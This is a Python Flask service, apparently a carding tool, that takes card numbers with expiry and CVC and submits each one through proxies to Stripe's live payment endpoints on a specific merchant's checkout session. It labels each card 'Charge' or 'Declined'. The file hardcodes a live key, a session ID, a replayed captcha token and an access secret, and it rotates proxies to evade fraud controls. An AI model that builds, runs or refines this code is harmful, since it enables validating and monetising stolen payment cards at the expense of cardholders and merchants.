from flask import Flask, request, jsonify
import requests
import time
import threading
from datetime import datetime
import concurrent.futures

app = Flask(__name__)

proxies_list = []
current_proxy_index = 0
last_request_time = 0
request_interval = 10
request_lock = threading.Lock()

def load_proxies():
    global proxies_list
    try:
        with open('proxvies.txt', 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
    except:
        proxies_list = []

def get_next_proxy():
    global current_proxy_index
    if not proxies_list:
        return None
    proxy = proxies_list[current_proxy_index]
    current_proxy_index = (current_proxy_index + 1) % len(proxies_list)
    return {'http': proxy, 'https': proxy}

class CardChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://checkout.stripe.com',
            'referer': 'https://checkout.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
    def parse_card(self, card_string):
        """Parse card string in various formats"""
        try:
            parts = card_string.split('|')
            if len(parts) != 4:
                raise ValueError("Invalid card format")
            
            number = parts[0].strip()
            month = parts[1].strip()
            year = parts[2].strip()
            cvc = parts[3].strip()
            
            # Handle year format (convert 29 to 2029)
            if len(year) == 2:
                year = '20' + year
            
            return number, month, year, cvc
        except Exception as e:
            print(f"[ERROR] {e}")
            return None, None, None, None

    def create_payment_method(self, card_data, proxy=None):
        """Create payment method with card data"""
        number, month, year, cvc = card_data
        
        data = {
            'type': 'card',
            'card[number]': number,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'billing_details[name]': 'Mr cnn',
            'billing_details[email]': 'hwnjalbwnja@gmail.com',
            'billing_details[address][country]': 'EG',
            'muid': '30ebd20e-1d0a-4350-bbdb-ddb9895d5132d33297',
            'sid': 'e675a585-fea7-43d7-b3e8-028d7b99660be80dd9',
            'guid': '0114f2d4-41a9-47b8-b2b1-14d6026c0d075f5c99',
            'key': 'pk_live_51IPMPBCbQweON9shR8IRcNg9CfgREI5dMpuUzS19MdGRosb8pQScfDiuSaPNBlJmvOI7po6VFeaDMV2SY6NZZX1y005NWY0xJd',
            'payment_user_agent': 'stripe.js%2F5127fc55bb%3B+stripe-js-v3%2F5127fc55bb%3B+checkout',
            'client_attribution_metadata[client_session_id]': 'a29b9ba4-a9d0-452e-bf29-fc70276441b7',
            'client_attribution_metadata[checkout_session_id]': 'cs_live_a1jg2ITUUWuHvrRpWLK4jNlwaaOOUCVxiQPhC92ILVYgsrellDmIJpclot',
            'client_attribution_metadata[merchant_integration_source]': 'checkout',
            'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[checkout_config_id]': 'f37fdd27-0533-4291-88a6-c9326f08d18a'
        }
        
        try:
            if proxy:
                response = self.session.post(
                    'https://api.stripe.com/v1/payment_methods',
                    headers=self.headers,
                    data=data,
                    proxies=proxy,
                    timeout=30
                )
            else:
                response = self.session.post(
                    'https://api.stripe.com/v1/payment_methods',
                    headers=self.headers,
                    data=data,
                    timeout=30
                )
            return response
        except Exception as e:
            print(f"[ERROR] Payment method creation failed: {e}")
            return None

    def confirm_payment(self, payment_method_id, proxy=None):
        """Confirm payment with payment method ID"""
        data = {
            'eid': 'NA',
            'payment_method': payment_method_id,
            'expected_amount': '150',
            'last_displayed_line_item_group_details[subtotal]': '150',
            'last_displayed_line_item_group_details[total_exclusive_tax]': '0',
            'last_displayed_line_item_group_details[total_inclusive_tax]': '0',
            'last_displayed_line_item_group_details[total_discount_amount]': '0',
            'last_displayed_line_item_group_details[shipping_rate_amount]': '0',
            'expected_payment_method_type': 'card',
            'muid': '30ebd20e-1d0a-4350-bbdb-ddb9895d5132d33297',
            'sid': 'e675a585-fea7-43d7-b3e8-028d7b99660be80dd9',
            'guid': '0114f2d4-41a9-47b8-b2b1-14d6026c0d075f5c99',
            'key': 'pk_live_51IPMPBCbQweON9shR8IRcNg9CfgREI5dMpuUzS19MdGRosb8pQScfDiuSaPNBlJmvOI7po6VFeaDMV2SY6NZZX1y005NWY0xJd',
            'version': '5127fc55bb',
            'init_checksum': 'pFHQ94YU6VVxejn23vEyH8DgTzEb7ebd',
            'js_checksum': 'qto~d%5En0%3DQU%3Eazbu%5Db%60bo%26o%3BeyaSUr%5Ev~Cox%3Cx%60%3C%24%7D%5BaasX%5Eo%3FU%5E%60w',
            'passive_captcha_token': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzMjcwNDQ3LCJjZGF0YSI6Ik1JbmZhKzF5dDZZNjl3VEtNNG9LOUxYR0l3WHc1OEtpZjZwdytZcmF2ckFSSXBtaVo0czAwYVpoSHl2RlZCYmVzS3dYZzluS01UaXJHN2RpRDFCbEhSNnZ2RXhReWpkMjdXZjJ1RW83OHBQRFhDN2tsaTZpMXFWbXRnUUpaQmplYTh3ZzhiQWIvSDNBdnZabnJhclZ5M3ZZeVBNK1hFR2o3cnRjWjMwdDBxL3FUOWNkc3hNVmVVV1VaaERIbWIwTjY1bmFLaEEzaVQwVWMzZz1UVEVvMkVxUld6cGZDMlM1IiwicGFzc2tleSI6IkVjMFpubk9WOFY1N09zVTd3TzRjYi8rM1hXSFNzWFdKM29IODRIdStIUU9LNTRIeVNuMWVidi9GQXEreDRsdkE5MGhsbmF1bVNOUHB1cWRJanVqZU8zV2RYVkVBV0JVZy9lRTFaZzdMeS9pRGRQaUliT01JNzFhdUFUbkRoNkdYeEViOWxCVVlrVjJQazVQT3B3K3pvS2V5VE5tOVAyNFlLeWhMYmxGVGRwNnhuV0VJY3JTdTZ2NWpramFwTXZMZE9yQktwaWVVQ0NlaW9rRGpiSzZqRGxvTlFYcTZFNWFWZzViTWhZR0RYRmFqcFJMRXRVNngyQ1M0eDg3ZFhxdGxXaDNXSU5HMGlNNHYyeVNUYVNXMEgyQWdnbnppU1FlaHdWd0pXS21IbVIyRXdkamRQcEdyZ2lrbmhFYWo4Qk9UclRpQ0UvWDVjMExtUUFxZ3FlSGE2RmdHdjlqZElLTWpvWHdGY2cvWExyVi9QelMrdHE5NHVndmFENTJhNmFSVVdSaE12MzRqMGpiWUVQNjF2VUs5ZTVsaXdmWjdXaE02b3hCZWRMZWV3MkJZak4xbExrVlYrdjJsM3pjWkZLZWM2M0VBVFBpdmJvN1BNeS9LaEJEaG42ZEl3S1BoOHpjTVBpVm1weTlxc3NsTHpaRldaSDhaM1dPZVFFcjR3RGMzVTlIS2x5TWJra05NbmlrZUpJL3QxTFdJQy9uZDZJYVFRZncvUW5kTjhZdEp1NTgwY08wekZiSUFFeGRYRDlabGhEcmZJeTloKzl1MnU3alYxWktSTEhRWWFSRWlGNURUbkwxZTI1N1dMYVpwd0FieC96b0hrdzVTTWExOEVxK1diLzFHd2dIS2hjZEcwT0pjaC9MWVFMSGtQaFF1TkYzUU9EdVZESEVnc1NzR1F6Rlk2dHRqT1lSRUN0dlFYc1c3aVVZU2piemlLUHljRjUwR2JlVWNHQlFOeVhHSW5BaXJ0R3hZdldrUlRFNlM0c0VEbGRLYllQeGxaUGxra1krR0orM0dZVnE3U2hBUHdVeXhlWlhhb1NqbGVobGlLd0YxRWVRcTh6b2RZTStta3J4cm5IRWFPbXh6VGZWM0pOUWpnK0M2QVZPTTREcE1pVnlPMHZBUGhGVmhPS29RbStKVjFURXNHRGFPU1FYdzhWRHpxWmVYTC95QmVYa2l0cEVaRzlJcDh4bzNzNGFvTzNmSUZvbzBqSVF5Zmg2VnVYZGxtNmJaRFRRYXIxQ2VPcG9oVFhVeFVJN29nRk9QMjByOVFxNG42RzEwLy9WRFBiaEhBNk5JMko3OWMxZG9Sa0VYcGF1WVBOVTdOVmZERmNSaDM3Q3ZpL1hZL0x4MnFuDFhycXFZVGUyRTRSb3c0d1IyODdsSFE3emdveEJEdE5EOGhHWXB3L2NTSnEzemRVMlpFanRaOUNzS2kxMXN1UjlYWjMwbHF5MFZocE5oMVdZSk5ZNmRKakxBVG5HY0E4ZUpMNmtnam5OMlZGUW16WHQveDJJSkJkdlBXUXVCeS9DSG5lRGJNZWNxOHUyME55VTlZWFFiMmlPeUxoU0RNZWk2NGhmMUVlMjF4VXl4L0VMcm5MbmNLbEhzSDk4SCtnU1JqeTZmWXRNeksweGczR3VGcnZSM0R2a3h6Y1AwM09iYUVkU2hhaGF4VWZlcFl2MGIrUFNOUGVtK1lNUENhZWFMb1B5M0xrbnd1N2lnK1Y5dGdMUDd1bnozOXRvdUZ2ZFluaUZvS01VS0NHZFRCVFcrL2FjRnk5Q1drNGxabGJoN3ByNEZWeUVaOURQY2RxV3FSem5qbWQycmM2YXl3SWFQaDFJRHIrSUxkOEsyVVQ0L3QwU0c4WWlVa1dCdWJoYUVmQ015OG1UMHdzemVIR0NpTEkzdmx2MDE3Q1VUNDEvWnZPMm9HZzltZ2p1cTExTTlyUno1Z2dodXBZSEtTYmdGK1lyRDVVRlRPK05KOEdUWEoyUWNJUzAwTGZjYUZQSTNjSGF4bmJZSTFKb2pxSzFFMG45ZHFVYzZwV1lLUjVhUlhFdk9tbU5IcFJPYmxwaEFOclJobXNJeGRaT3FQWk5CdXpKeWJFeS8ydytlRmY2Y2NBNTFGbGZSZnRRQit4dkY2b3cvenJqclZ2dTlEVWZJcWpid0I4bHJ4MUVlM1ZMWHhmcGI3SFMxd1VtSkhUTUtGWlFBNTJSNkxud1NhNWZFNVdwbnY1M1lkZjlSdGsvOVFMc2dNS2FDM0Z3b3N4em5kN21HaVNTMVlkdnN3OFRERFdURzN5UlBRcGFBR3k0cWN3eWVtQ2ZlR3JHTVp2S3d2c2R0c1RHZEFtUnBrSXR3M2lPRTZ3N1MySlJER0dodkVjdDlzeTRBa01oOG5STks1YUpSeFArZHEzbkVwU0FkOHcvcmQ2ZWF6WG8yczBTdzVRSUkxNzAya0lrOURNTHVlNmpIZHNyamxUTGYrYnk0Uit0eVFnUEE5SjcwRC9ESWMwUS9RczdPeDVLRWpyZ2NCSXVheEl0NVpabkZ4UmlSaTlNWDJQVDR4Rm1DRWdlVzdwYmVpTVJuallFZjZSYnUxMEJyTU1FdjQvWVllMEZaakY0SVlhNm51V2pnTXpxM0NjZEMzdDB4K3BpMVNxL0o0NDk0b0pmYnlNbTZGYXc3SWkwPSIsImtyIjoiMzkxOWZhYjIiLCJzaGFyZF9pZCI6NTM1NzY1NTl9.G-GWocqlIDgL08fM9zvyy_YCW1m3mO63zuHk-Ec9aZg',
            'passive_captcha_ekey': '',
            'rv_timestamp': 'qto%3En%3CQ%3DU%26CyY%26%60%3EX%5Er%3CYNr%3CYN%60%3CY_C%3CY_C%3CY%5E%60zY_%60%3CY%5En%7BU%3Eo%26U%26CyXO%5C%3EXxYxXOMye%3DQrXO%23CYOd%3DYuQrXuQuY_%5DvY%26%23%25e%26L%3EeuQv%5BbX%3CXtn%7BU%3Ee%26U%26CydOT%23exerXb%5C%26%5BOovX_UrXb%5DsYxMsYOX%3DYbL%26dbL%3CdOn%3Ce%3DouYRMyYuL%23eu%60%3E%5BO%60%23YuMu%5BbL%23d%26T%3DXOT%3Ceu%23Cd%25o%3FU%5E%60w',
            'referrer': 'https%3A%2F%2Fwww.mtcgame.com',
            'client_attribution_metadata[client_session_id]': 'a29b9ba4-a9d0-452e-bf29-fc70276441b7',
            'client_attribution_metadata[checkout_session_id]': 'cs_live_a1jg2ITUUWuHvrRpWLK4jNlwaaOOUCVxiQPhC92ILVYgsrellDmIJpclot',
            'client_attribution_metadata[merchant_integration_source]': 'checkout',
            'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[checkout_config_id]': 'f37fdd27-0533-4291-88a6-c9326f08d18a'
        }
        
        try:
            if proxy:
                response = self.session.post(
                    'https://api.stripe.com/v1/payment_pages/cs_live_a1jg2ITUUWuHvrRpWLK4jNlwaaOOUCVxiQPhC92ILVYgsrellDmIJpclot/confirm',
                    headers=self.headers,
                    data=data,
                    proxies=proxy,
                    timeout=30
                )
            else:
                response = self.session.post(
                    'https://api.stripe.com/v1/payment_pages/cs_live_a1jg2ITUUWuHvrRpWLK4jNlwaaOOUCVxiQPhC92ILVYgsrellDmIJpclot/confirm',
                    headers=self.headers,
                    data=data,
                    timeout=30
                )
            return response
        except Exception as e:
            print(f"[ERROR] Payment confirmation failed: {e}")
            return None

    def check_for_complete(self, response1, response2):
        """Check if 'complete' exists in any of the responses"""
        complete_found = False
        
        try:
            # Check first response
            if response1:
                response1_text = response1.text.lower()
                response1_json = response1.json() if response1.headers.get('content-type', '').startswith('application/json') else {}
                
                if 'complete' in response1_text or any('complete' in str(value).lower() for value in response1_json.values()):
                    complete_found = True
                    
            # Check second response
            if response2:
                response2_text = response2.text.lower()
                response2_json = response2.json() if response2.headers.get('content-type', '').startswith('application/json') else {}
                
                if 'complete' in response2_text or any('complete' in str(value).lower() for value in response2_json.values()):
                    complete_found = True
                    
        except Exception:
            pass
            
        return complete_found

    def check_card(self, card_string, proxy=None):
        """Check a single card"""
        print(f"[INFO] Checking card: {card_string}")
        print(f"[USER] @R_O_P_D")
        
        # Parse card data
        card_data = self.parse_card(card_string)
        if None in card_data:
            print(f"[RESULT] Declined ❌")
            return False
        
        # Create payment method
        print(f"[STEP 1] Creating payment method...")
        pm_response = self.create_payment_method(card_data, proxy)
        if not pm_response:
            print(f"[RESULT] Declined ❌")
            return False
            
        # Confirm payment
        payment_method_id = None
        if pm_response.status_code == 200:
            try:
                pm_data = pm_response.json()
                payment_method_id = pm_data.get('id')
                
                if payment_method_id:
                    # Wait 1 second between APIs
                    time.sleep(1)
                    
                    # Confirm payment
                    print(f"[STEP 2] Confirming payment...")
                    confirm_response = self.confirm_payment(payment_method_id, proxy)
                    
                    # Check for 'complete' in responses
                    if self.check_for_complete(pm_response, confirm_response):
                        print(f"[RESULT] Charge ✅")
                        return True
                    else:
                        print(f"[RESULT] Declined ❌")
                        return False
                else:
                    print(f"[RESULT] Declined ❌")
                    return False
                    
            except Exception as e:
                print(f"[RESULT] Declined ❌")
                return False
        else:
            print(f"[RESULT] Declined ❌")
            return False

def check_card(card_data):
    global last_request_time
    
    with request_lock:
        current_time = time.time()
        time_since_last = current_time - last_request_time
        if time_since_last < request_interval:
            time.sleep(request_interval - time_since_last)
        
        last_request_time = time.time()
    
    try:
        card_parts = card_data.split('|')
        if len(card_parts) != 4:
            return {"error": "Invalid card format", "by": "@R_O_P_D"}
        
        card_number, exp_m, exp_y, cvv = card_parts
        
        if len(exp_y) == 2:
            exp_y = '20' + exp_y
        
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(exp_y) < current_year or (int(exp_y) == current_year and int(exp_m) < current_month):
            return {"status": "Expired Card", "by": "@R_O_P_D"}
        
        proxy = get_next_proxy()
        
        # Use the new CardChecker class
        checker = CardChecker()
        result = checker.check_card(card_data, proxy)
        
        if result:
            status = "Charge ✅"
        else:
            status = "Declined 🚫"
        
        return {
            "status": status,
            "card": card_number,
            "expiry": f"{exp_m}/{exp_y}",
            "by": "@R_O_P_D"
        }
        
    except Exception as e:
        return {"error": str(e), "by": "@R_O_P_D"}

@app.route('/check', methods=['GET'])
def check_card_route():
    secret_key = request.headers.get('X-Secret-Key')
    card_data = request.args.get('card')
    
    if not card_data:
        return jsonify({"error": "No card data provided", "by": "@R_O_P_D"})
    
    if secret_key == "XAZ0OWJEOEI3737079DFkdh":
        result = check_card(card_data)
        return jsonify(result)
    else:
        return jsonify({"error": "Invalid secret key", "by": "@R_O_P_D"})

if __name__ == '__main__':
    load_proxies()
    app.run(host='0.0.0.0', port=5000)
